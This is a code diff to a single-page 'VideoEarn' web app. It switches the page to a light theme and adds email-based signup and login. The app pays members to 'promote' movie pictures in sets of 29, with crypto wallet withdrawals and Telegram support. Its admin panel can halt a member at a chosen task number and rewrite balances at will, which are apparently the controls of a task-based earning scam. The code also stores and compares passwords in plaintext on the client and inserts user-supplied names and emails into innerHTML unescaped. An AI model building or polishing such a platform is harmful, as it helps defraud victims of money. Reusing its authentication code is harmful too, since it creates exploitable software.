@@ -9,15 +9,16 @@
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #0b0f17;
-      --card-bg: rgba(23, 31, 48, 0.85);
-      --border: rgba(255, 255, 255, 0.1);
-      --primary: #6366f1;
-      --accent: linear-gradient(135deg, #e11d48 0%, #a855f7 50%, #6366f1 100%);
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
-      --success: #22c55e;
-      --warning: #f59e0b;
+      --bg: #f1f5f9;
+      --card-bg: #ffffff;
+      --border: #e2e8f0;
+      --primary: #2563eb;
+      --primary-hover: #1d4ed8;
+      --accent: linear-gradient(135deg, #2563eb 0%, #3b82f6 50%, #60a5fa 100%);
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --success: #16a34a;
+      --warning: #d97706;
       --telegram: #0088cc;
     }
 
@@ -26,38 +27,43 @@
     .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 16px; }
 
     header { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
-    .logo { font-size: 1.5rem; font-weight: 800; background: var(--accent); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-    .nav-btn { background: rgba(255,255,255,0.08); border: 1px solid var(--border); color: var(--text); padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; }
+    .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); }
+    .nav-btn { background: #ffffff; border: 1px solid var(--border); color: var(--text); padding: 6px 12px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: 600; }
+    .nav-btn:hover { background: #f8fafc; }
 
-    .card { background: var(--card-bg); border: 1px solid var(--border); backdrop-filter: blur(12px); border-radius: 16px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
-    h2, h3, h4 { margin-bottom: 12px; }
+    .card { background: var(--card-bg); border: 1px solid var(--border); border-radius: 16px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03); }
+    h2, h3, h4 { margin-bottom: 12px; color: var(--text); }
     p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 12px; }
 
-    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 600; color: #fff; background: var(--accent); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; }
-    .btn-secondary { background: rgba(255,255,255,0.1); border: 1px solid var(--border); }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 600; color: #fff; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; }
+    .btn:hover { background: var(--primary-hover); }
+    .btn-secondary { background: #f1f5f9; color: var(--text); border: 1px solid var(--border); }
+    .btn-secondary:hover { background: #e2e8f0; }
     .btn-telegram { background: var(--telegram); color: #fff; }
     
-    input, select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); color: var(--text); margin-bottom: 10px; }
+    label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 4px; }
+    input, select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: #f8fafc; color: var(--text); margin-bottom: 12px; font-size: 0.9rem; }
+    input:focus, select:focus { outline: 2px solid var(--primary); background: #fff; }
 
-    .progress-bar { background: rgba(255,255,255,0.1); height: 10px; border-radius: 5px; overflow: hidden; margin: 12px 0; }
+    .progress-bar { background: #e2e8f0; height: 10px; border-radius: 5px; overflow: hidden; margin: 12px 0; }
     .progress-fill { background: var(--primary); height: 100%; width: 0%; transition: width 0.3s ease; }
-    .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 12px; background: rgba(0,0,0,0.2); }
-    .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #1a202c; }
+    .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 12px; background: #f8fafc; }
+    .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #e2e8f0; }
     
     .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px; }
-    .stat-card { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; text-align: center; border: 1px solid var(--border); }
-    .stat-card span { font-size: 0.8rem; color: var(--text-muted); }
-    .stat-card div { font-size: 1.1rem; font-weight: 700; color: var(--success); }
+    .stat-card { background: #f8fafc; padding: 10px; border-radius: 8px; text-align: center; border: 1px solid var(--border); }
+    .stat-card span { font-size: 0.8rem; color: var(--text-muted); font-weight: 500; }
+    .stat-card div { font-size: 1.1rem; font-weight: 700; color: var(--primary); }
 
     .admin-section { border-top: 1px dashed var(--border); padding-top: 16px; margin-top: 16px; }
     .hidden { display: none !important; }
     .badge { padding: 4px 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 600; }
-    .badge-pending { background: var(--warning); color: #000; }
-    .badge-approved { background: var(--success); color: #000; }
-    .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-size: 0.85rem; }
+    .badge-pending { background: #fef3c7; color: var(--warning); }
+    .badge-approved { background: #dcfce7; color: var(--success); }
+    .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 600; }
     
-    .user-list-box { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 150px; overflow-y: auto; margin-bottom: 12px; }
-    .user-item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
+    .user-list-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 150px; overflow-y: auto; margin-bottom: 12px; }
+    .user-item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
   </style>
 </head>
 <body>
@@ -73,7 +79,9 @@
       <div id="login-box">
         <h3>Welcome Back</h3>
         <p>Log in to your VideoEarn account</p>
-        <input type="text" id="login-username" placeholder="Username">
+        <label>Email or Username</label>
+        <input type="text" id="login-identifier" placeholder="Enter Email or Username">
+        <label>Password</label>
         <input type="password" id="login-password" placeholder="Password">
         <button class="btn" onclick="userLogin()">Log In</button>
         <p style="margin-top: 12px; text-align: center;">
@@ -84,7 +92,11 @@
       <div id="signup-box" class="hidden">
         <h3>Create Account</h3>
         <p>Register as a new member to start earning</p>
+        <label>Email Address</label>
+        <input type="email" id="signup-email" placeholder="name@example.com">
+        <label>Username</label>
         <input type="text" id="signup-username" placeholder="Choose Username">
+        <label>Password</label>
         <input type="password" id="signup-password" placeholder="Create Password">
         <button class="btn" onclick="userSignup()">Create Account</button>
         <p style="margin-top: 12px; text-align: center;">
@@ -104,15 +116,15 @@
         <div class="stats-grid">
           <div class="stat-card">
             <span>Current Set</span>
-            <div id="current-set-display" style="color:var(--text)">Set 1 / 3</div>
+            <div id="current-set-display">Set 1 / 3</div>
           </div>
           <div class="stat-card">
             <span>Total Earnings</span>
-            <div id="worker-balance">$0.00</div>
+            <div id="worker-balance" style="color: var(--success);">$0.00</div>
           </div>
         </div>
 
-        <div style="display: flex; justify-content: space-between; font-size: 0.85rem;">
+        <div style="display: flex; justify-content: space-between; font-size: 0.85rem; font-weight: 500;">
           <span>Progress (Set <span id="set-num-text">1</span>)</span>
           <span id="progress-text">0 / 29 Completed</span>
         </div>
@@ -137,8 +149,10 @@
       <div class="card">
         <h3>Withdraw Earnings</h3>
         <p>Request withdrawal once available balance is ready.</p>
-        <input type="text" id="withdraw-wallet-address" placeholder="Enter Crypto Wallet Address (e.g. USDT, BTC, ETH)">
-        <input type="number" id="withdraw-amount-input" placeholder="Enter Withdrawal Amount ($)" step="0.01">
+        <label>Crypto Wallet Address</label>
+        <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
+        <label>Withdrawal Amount ($)</label>
+        <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
         <button class="btn btn-secondary" onclick="requestWithdrawal()">Apply for Withdrawal</button>
         <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
       </div>
@@ -155,6 +169,7 @@
     <div id="admin-view" class="hidden">
       <div class="card" id="admin-login-card">
         <h3>Admin Access Required</h3>
+        <label>Password</label>
         <input type="password" id="admin-pass-input" placeholder="Enter Admin Password">
         <button class="btn" onclick="loginAdmin()">Login to Admin Panel</button>
       </div>
@@ -175,20 +190,20 @@
           <!-- Manage Selected Member -->
           <div class="admin-section">
             <h4>Manage Selected Member</h4>
-            <label style="font-size: 0.8rem;">Select Member to Manage:</label>
+            <label>Select Member to Manage:</label>
             <select id="admin-selected-user" onchange="loadAdminUserData()"></select>
 
-            <label style="font-size: 0.8rem;">Select Set Number (Set 1, 2, or 3):</label>
+            <label>Select Set Number (Set 1, 2, or 3):</label>
             <select id="admin-user-set-select">
               <option value="1">Set 1</option>
               <option value="2">Set 2</option>
               <option value="3">Set 3</option>
             </select>
 
-            <label style="font-size: 0.8rem;">Stop Member At Work # (1 to 29):</label>
+            <label>Stop Member At Work # (1 to 29):</label>
             <input type="number" id="admin-stop-work-num" min="1" max="29" value="29">
 
-            <label style="font-size: 0.8rem;">Edit Member Balance ($):</label>
+            <label>Edit Member Balance ($):</label>
             <input type="number" id="admin-user-balance" step="0.01">
 
             <button class="btn btn-secondary" onclick="saveAdminUserSettings()">Update Member Settings</button>
@@ -198,7 +213,7 @@
           <!-- Manage Telegram Support Link -->
           <div class="admin-section">
             <h4>Telegram Support Settings</h4>
-            <label style="font-size: 0.8rem;">Telegram Support Link or Username:</label>
+            <label>Telegram Support Link or Username:</label>
             <input type="text" id="admin-telegram-link" placeholder="e.g. https://t.me/your_admin_username">
             <button class="btn btn-secondary" onclick="saveTelegramLink()">Save Telegram Support Link</button>
           </div>
@@ -206,23 +221,23 @@
           <!-- Upload Picture & Edit Settings -->
           <div class="admin-section">
             <h4>Upload & Edit Movie Pictures</h4>
-            <label style="font-size: 0.8rem;">Select Set Number (1, 2, or 3):</label>
+            <label>Select Set Number (1, 2, or 3):</label>
             <select id="edit-set-num">
               <option value="1">Set 1</option>
               <option value="2">Set 2</option>
               <option value="3">Set 3</option>
             </select>
 
-            <label style="font-size: 0.8rem;">Picture Number (1 to 29):</label>
+            <label>Picture Number (1 to 29):</label>
             <input type="number" id="edit-img-index" min="1" max="29" value="1">
 
-            <label style="font-size: 0.8rem;">Upload Movie Picture:</label>
+            <label>Upload Movie Picture:</label>
             <input type="file" id="edit-img-file" accept="image/*">
 
-            <label style="font-size: 0.8rem;">Reward Amount ($):</label>
+            <label>Reward Amount ($):</label>
             <input type="number" id="edit-img-reward" value="0.50" step="0.01">
 
-            <label style="font-size: 0.8rem;">Admin Comment:</label>
+            <label>Admin Comment:</label>
             <input type="text" id="edit-img-comment" placeholder="Featured movie promo note...">
 
             <button class="btn btn-secondary" onclick="savePictureAndSettings()">Save Picture & Details</button>
@@ -265,19 +280,30 @@
     }
 
     function userSignup() {
+      const email = document.getElementById('signup-email').value.trim().toLowerCase();
       const u = document.getElementById('signup-username').value.trim();
       const p = document.getElementById('signup-password').value.trim();
 
-      if (!u || !p) {
-        alert('Please fill in both fields.');
+      if (!email || !u || !p) {
+        alert('Please fill in all fields including email.');
         return;
       }
+
+      // Check if username already exists
       if (users[u]) {
-        alert('Username already exists. Please choose another or log in.');
+        alert('Username already exists. Please choose another.');
+        return;
+      }
+
+      // Check if email already exists
+      const emailExists = Object.values(users).some(user => user.email === email);
+      if (emailExists) {
+        alert('An account with this email already exists. Please log in.');
         return;
       }
 
       users[u] = {
+        email: email,
         password: p,
         currentSet: 1,
         completedInSet: 0,
@@ -295,15 +321,28 @@
     }
 
     function userLogin() {
-      const u = document.getElementById('login-username').value.trim();
+      const identifier = document.getElementById('login-identifier').value.trim().toLowerCase();
       const p = document.getElementById('login-password').value.trim();
 
-      if (users[u] && users[u].password === p) {
-        currentUser = u;
-        localStorage.setItem('ve_current_user', u);
+      if (!identifier || !p) {
+        alert('Please enter your email/username and password.');
+        return;
+      }
+
+      // Find user by username or email
+      let matchedUsername = null;
+      if (users[identifier]) {
+        matchedUsername = identifier;
+      } else {
+        matchedUsername = Object.keys(users).find(u => users[u].email === identifier);
+      }
+
+      if (matchedUsername && users[matchedUsername].password === p) {
+        currentUser = matchedUsername;
+        localStorage.setItem('ve_current_user', matchedUsername);
         renderUI();
       } else {
-        alert('Invalid Username or Password!');
+        alert('Invalid Email/Username or Password!');
       }
     }
 
@@ -377,12 +416,12 @@
       usernames.forEach(u => {
         const option = document.createElement('option');
         option.value = u;
-        option.innerText = u;
+        option.innerText = `${u} (${users[u].email || 'No email'})`;
         select.appendChild(option);
 
         const item = document.createElement('div');
         item.className = 'user-item';
-        item.innerHTML = `<span><strong>${u}</strong> (Set ${users[u].currentSet})</span> <span>$${users[u].balance.toFixed(2)}</span>`;
+        item.innerHTML = `<span><strong>${u}</strong> <small>(${users[u].email || 'No email'})</small></span> <span>$${users[u].balance.toFixed(2)}</span>`;
         userListContainer.appendChild(item);
       });
 
@@ -596,7 +635,7 @@
       document.getElementById('movie-reward').innerText = `$${itemData.reward || '0.50'}`;
       document.getElementById('admin-comment').innerText = `Admin Comment: ${itemData.comment || 'Ready to promote!'}`;
       
-      const defaultPlaceholder = `https://via.placeholder.com/400x250?text=Set+${user.currentSet}+-+Picture+${currentImgIndex}`;
+      const defaultPlaceholder = `https://via.placeholder.com/400x250/e2e8f0/2563eb?text=Set+${user.currentSet}+-+Picture+${currentImgIndex}`;
       document.getElementById('movie-img').src = itemData.image || defaultPlaceholder;
 
       const wStatus = document.getElementById('withdraw-status');
